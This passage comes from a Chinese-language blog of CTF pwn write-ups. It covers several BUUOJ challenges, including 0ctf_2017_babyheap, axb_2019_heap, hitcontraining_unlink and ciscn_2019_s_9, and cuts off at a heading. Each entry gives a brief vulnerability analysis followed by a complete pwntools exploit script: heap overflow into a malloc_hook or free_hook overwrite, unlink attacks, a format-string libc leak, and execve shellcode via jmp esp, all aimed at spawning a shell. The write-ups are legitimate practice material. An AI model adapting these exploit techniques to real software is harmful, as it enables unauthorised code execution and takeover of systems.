href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a><code>0ctf_2017_babyheap</code></h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>保护全开，程序逆向起来看起来很乱，并且堆块定位是通过栈来传参，没有全局指针。</p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>calloc 函数基本跟malloc一样，但是再分配好堆块时，会把分配到的堆块全部清理为0。</p><h5 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h5><p>无法通过传统的unsortbin来leak libc，结合fill函数中的堆溢出即可。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>Fill 函数中，明显有堆溢出，且十分好用，效果很大。</p><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./0ctf_2017_babyheap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26374</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'Command'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'Size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'mand'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#1</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#5</span>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xa1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span>fill(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,payload)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x30</span>)dump(<span class="hljs-number">2</span>)ru(<span class="hljs-string">'Content: \n'</span>)base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,base)add(<span class="hljs-number">0x50</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span>free(<span class="hljs-number">7</span>)free(<span class="hljs-number">8</span>)malloc_hook = base + <span class="hljs-number">0x3c4b10</span>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">13</span> + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook<span class="hljs-number">-0x23</span>) fill(<span class="hljs-number">5</span>,len(payload),payload)add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span>rec = rce16[<span class="hljs-number">1</span>] + basepayload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x13</span> + p64(rec)fill(<span class="hljs-number">8</span>,len(payload),payload)add(<span class="hljs-number">0x20</span>)itr()</code></pre></div><h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a><code>wustctf2020_closed</code></h2><div class="hljs"><pre><code class="hljs c">close(<span class="hljs-number">1</span>);close(<span class="hljs-number">2</span>);<span class="hljs-keyword">return</span> shell();</code></pre></div><p>直接就给你shell了，但是stdout已经被关闭了。但是对其文件描述符<code>1</code>进行重定向为没有关闭的<code>0</code>即可。</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> 1&gt;&amp;0 &amp;&amp; cat flag</code></pre></div><h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a><code>wustctf2020_getshell_2</code></h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">ssize_t</span> vulnerable()&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-18h]</span>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x24</span>u);&#125;</code></pre></div><p>明显可以看出只可以控制2个gadget。优先想到了栈迁移。可是也没有合适地方去迁移利用。</p><p>倘若可以控制3个gadget，直接：</p><div class="hljs"><pre><code class="hljs c">p32(system.plt) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(sh)</code></pre></div><p>这样就可以拿到shell了。</p><p>因为平时rop时，32位下自己<strong>十分</strong>经常**用<code>函数的plt+返回地址+参数1</code>，造成思路卡顿。</p><h4 id="突破"><a href="#突破" class="headerlink" title="突破"></a>突破</h4><p>但是尝试去看下后门函数：</p><div class="hljs"><pre><code class="hljs c">.text:<span class="hljs-number">08048521</span> ; <span class="hljs-number">2</span>:   <span class="hljs-keyword">return</span> system(<span class="hljs-string">"/bbbbbbbbin_what_the_f?ck__--??/sh"</span>);.text:<span class="hljs-number">08048521</span>                 sub     esp, <span class="hljs-number">0</span>Ch.text:<span class="hljs-number">08048524</span>                 push    offset command  ; <span class="hljs-string">"/bbbbbbbbin_what_the_f?ck__--??/sh"</span>.text:<span class="hljs-number">08048529</span>                 call    _system.text:<span class="hljs-number">0804852</span>E                 add     esp, <span class="hljs-number">10</span>h.text:<span class="hljs-number">08048531</span>                 nop.text:<span class="hljs-number">08048532</span>                 leave.text:<span class="hljs-number">08048533</span>                 retn</code></pre></div><p>在08048524处，可以看到起其call system前，<code>push    offset command</code>，把这个字符串压栈，来作为第一个参数。</p><p> 那就在溢出时，返回地址填上<code>08048529</code> ，在自己填上sh的地址即可了。</p><p>这样就在call system时，完成的是<code>system(sh)</code>。</p><p>其实也是很简单的：</p><p>由于<code>因为平时rop时，32位下自己经常用`函数的plt+返回地址+参数1`，造成思路卡顿。</code> ，其实自己分析以后就是：<code>函数的plt+4字节+参数1</code>。</p><p>溢出时，填上<code>p32(0x8048529) + p32(sh)</code><br>栈信息：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-selector-tag">0000</span>| <span class="hljs-selector-tag">0xffcca2fc</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x8048529</span> (&lt;shell+<span class="hljs-number">14</span>&gt;:     call   <span class="hljs-number">0</span>x80483e0 &lt;system<span class="hljs-variable">@plt</span>&gt;)<span class="hljs-selector-tag">0004</span>| <span class="hljs-selector-tag">0xffcca300</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x8048670</span> <span class="hljs-selector-tag">--</span>&gt; <span class="hljs-selector-tag">0x6873</span> (<span class="hljs-string">'sh'</span>)</code></pre></div><p>在溢出调用时,ret到：</p><div class="hljs"><pre><code class="hljs undefined">.<span class="hljs-built_in">text</span>:<span class="hljs-number">08048529</span>                 <span class="hljs-built_in">call</span>    <span class="hljs-variable">_system</span></code></pre></div><p>其就是</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">push</span> <span class="hljs-built_in">eip</span>+<span class="hljs-number">4</span><span class="hljs-keyword">jmp</span> system.plt</code></pre></div><p>然后栈就变成了：</p><div class="hljs"><pre><code class="hljs undefined">=&gt; <span class="hljs-number">0x80483e0</span> &lt;<span class="hljs-symbol">system@</span>plt&gt;:      jmp    DWORD PTR ds:<span class="hljs-number">0x804a018</span> | <span class="hljs-number">0x80483e6</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">6</span>&gt;:    push   <span class="hljs-number">0x18</span> | <span class="hljs-number">0x80483eb</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">11</span>&gt;:   jmp    <span class="hljs-number">0x80483a0</span> | <span class="hljs-number">0x80483f0</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt&gt;:   jmp    DWORD PTR ds:<span class="hljs-number">0x804a01c</span> | <span class="hljs-number">0x80483f6</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt+<span class="hljs-number">6</span>&gt;: push   <span class="hljs-number">0x20</span> |-&gt;   <span class="hljs-number">0x80483e6</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">6</span>&gt;:        push   <span class="hljs-number">0x18</span>       <span class="hljs-number">0x80483eb</span> &lt;<span class="hljs-symbol">system@</span>plt+<span class="hljs-number">11</span>&gt;:       jmp    <span class="hljs-number">0x80483a0</span>       <span class="hljs-number">0x80483f0</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt&gt;:       jmp    DWORD PTR ds:<span class="hljs-number">0x804a01c</span>       <span class="hljs-number">0x80483f6</span> &lt;<span class="hljs-symbol">__libc_start_main@</span>plt+<span class="hljs-number">6</span>&gt;:     push   <span class="hljs-number">0x20</span>                                                                  JUMP <span class="hljs-keyword">is</span> taken[------------------------------------stack-------------------------------------]<span class="hljs-number">0000</span>| <span class="hljs-number">0xffcca2fc</span> --&gt; <span class="hljs-number">0x804852e</span> (&lt;shell+<span class="hljs-number">19</span>&gt;:     add    esp,<span class="hljs-number">0x10</span>)<span class="hljs-number">0004</span>| <span class="hljs-number">0xffcca300</span> --&gt; <span class="hljs-number">0x8048670</span> --&gt; <span class="hljs-number">0x6873</span> (<span class="hljs-string">'sh'</span>)</code></pre></div><p>这就变成了，自己熟悉的<code>函数的plt+返回地址+参数1</code></p><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn <span class="hljs-built_in">import</span> *<span class="hljs-built_in">import</span> time<span class="hljs-attr">local_file</span>  = './wustctf2020_getshell_2'<span class="hljs-attr">elf</span> = ELF(local_file)context.<span class="hljs-attr">log_level</span> = 'debug'<span class="hljs-attr">debug</span> = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    <span class="hljs-attr">io</span> = process(local_file)    <span class="hljs-attr">libc</span> = elf.libc<span class="hljs-keyword">else</span>:    <span class="hljs-attr">io</span> = remote('node3.buuoj.cn',<span class="hljs-number">25032</span>)    <span class="hljs-attr">libc</span> = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.<span class="hljs-attr">arch</span> = elf.archcontext.<span class="hljs-attr">terminal</span> = ['tmux','neww']<span class="hljs-attr">offset</span> = <span class="hljs-number">28</span><span class="hljs-attr">sh</span> = elf.search('sh\x00').next()<span class="hljs-attr">system</span> = <span class="hljs-number">0</span>x8048529<span class="hljs-attr">payload</span> = 'a' * offset + p32(system) + p32(sh)s(payload)itr()</code></pre></div><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a><code>axb_2019_heap</code></h2><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>保护全开。</p><h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul><li>格式化字符串漏洞，可以泄漏出程序和libc的基址</li><li>edit函数中，错误的size选取，导致每次可以多溢出0x10的字节，威力就很大了，prev size与 size都可以改到。</li></ul><p>直接进行unlink攻击即可。估计就是考这个的，程序限制了不能申请0x80以下的堆块，且key值基本没办法改到。</p><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./axb_2019_heap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26837</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'(0-10)'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sla(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'content'</span>,str(data))payload = <span class="hljs-string">'%15$p'</span> + <span class="hljs-string">'%11$p'</span>sla(<span class="hljs-string">'name'</span>,payload)ru(<span class="hljs-string">'Hello, 0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x20830</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)ru(<span class="hljs-string">'0x'</span>)bin_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x1186</span>info_addr(<span class="hljs-string">'bin_base'</span>,bin_base)note = bin_base + <span class="hljs-number">0x202060</span>key = bin_base + <span class="hljs-number">0x202040</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'bbbbbbbb'</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">'cccccccc'</span>)payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + p64(note<span class="hljs-number">-0x18</span>) + p64(note - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x110</span>)edit(<span class="hljs-number">0</span>,payload)free(<span class="hljs-number">1</span>)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_basepayload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(free_hook) + p64(<span class="hljs-number">0x88</span>)edit(<span class="hljs-number">0</span>,payload)rec = rce16[<span class="hljs-number">1</span>] + libc_baseedit(<span class="hljs-number">0</span>,p64(rec))free(<span class="hljs-number">2</span>)itr()</code></pre></div><h2 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a><code>hitcontraining_unlink</code></h2><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>Edit函数中，有个大威力的堆溢出。<br>用unlink攻击。</p><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bamboobox'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26818</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'len'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'len'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))note = <span class="hljs-number">0x006020C0</span> + <span class="hljs-number">8</span>add(<span class="hljs-number">0x88</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'bbbbbbbb'</span>)add(<span class="hljs-number">0x88</span>,<span class="hljs-string">'cccccccc'</span>)payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + p64(note<span class="hljs-number">-0x18</span>) + p64(note - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x110</span>)edit(<span class="hljs-number">0</span>,len(payload),payload)free(<span class="hljs-number">1</span>)show()ru(<span class="hljs-string">'0 : '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c48e0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_basepayload = p64(libc_base + <span class="hljs-number">0x3c48e0</span>) + p64(<span class="hljs-number">0</span>)  + p64(<span class="hljs-number">0x88</span>) + p64(free_hook)edit(<span class="hljs-number">0</span>,len(payload),payload)rec = rce16[<span class="hljs-number">1</span>] + libc_baseedit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(rec))free(<span class="hljs-number">2</span>)itr()</code></pre></div><h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a><code>ciscn_2019_s_9</code></h2><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>32位程序，保护全关，目标定位着shellcode去。</p><h4 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>栈溢出，可以溢出14个字节，这是32位程序用rop就可以打了。但是为相对麻烦一点。</p><div class="hljs"><pre><code class="hljs python">.text:<span class="hljs-number">08048551</span>             hint            proc near.text:<span class="hljs-number">08048551</span>             ; __unwind &#123;.text:<span class="hljs-number">08048551</span> <span class="hljs-number">55</span>                          push    ebp.text:<span class="hljs-number">08048552</span> <span class="hljs-number">89</span> E5                       mov     ebp, esp.text:<span class="hljs-number">08048554</span> FF E4                       jmp     esp.text:<span class="hljs-number">08048554</span>             hint            endp</code></pre></div><p>在题目当中，有个hint函数，就是给提示的，提示到<code>jmp esp</code> 这个gadget。</p><p>其中，可以想到在栈溢出中，有给<code>ret addr</code>填上<code>jmp esp</code> ，在接上shellcode。这应该是很经典的用法。</p><p>参考链接：<a href="http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/</a></p><p>构造思路：</p><div class="hljs"><pre><code class="hljs undefined">Payload = overflow + jmp esp<span class="hljs-built_in"> address </span>+ shellcode</code></pre></div><p>但是这个题就是只能溢出14字节，返回地址再占用4字节，应该没有10字节这样少的shellcode。</p><p>所以转变一下，栈上填充好shellcode，然后<code>jmp esp address</code>，接着让其执行<code>sub esp,0x28</code>，然后在跳转esp。</p><div class="hljs"><pre><code class="hljs undefined">Payload = shellcode + jmp esp<span class="hljs-built_in"> address </span>+ sub esp,esp + jmp esp</code></pre></div><p>其实基本都是一样的，后面跟上的，也可以理解为调整esp指针的shellcode。</p><h3 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_s_9'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26283</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()jmp_esp = <span class="hljs-number">0x08048554</span>shellcode= <span class="hljs-string">'\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'</span>shellcode = shellcode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">'\x00'</span>)gadgets = asm(<span class="hljs-string">'sub esp,0x28;jmp esp'</span>)print(gadgets)payload = shellcode + p32(jmp_esp) + gadgets<span class="hljs-comment"># debug()</span>sl(payload)itr()</code></pre></div><h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a><code>roarctf_2019_realloc_magic</code></h2><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><h4 id="漏洞点-4"><a href="#漏洞点-4" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul><li>UAF</li></ul><p>程序用realloc函数来分配堆块，因为不熟悉这个搞的我，好久没有做出来。</p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><h4 id="realloc的特点"><a href="#realloc的特点" class="headerlink" 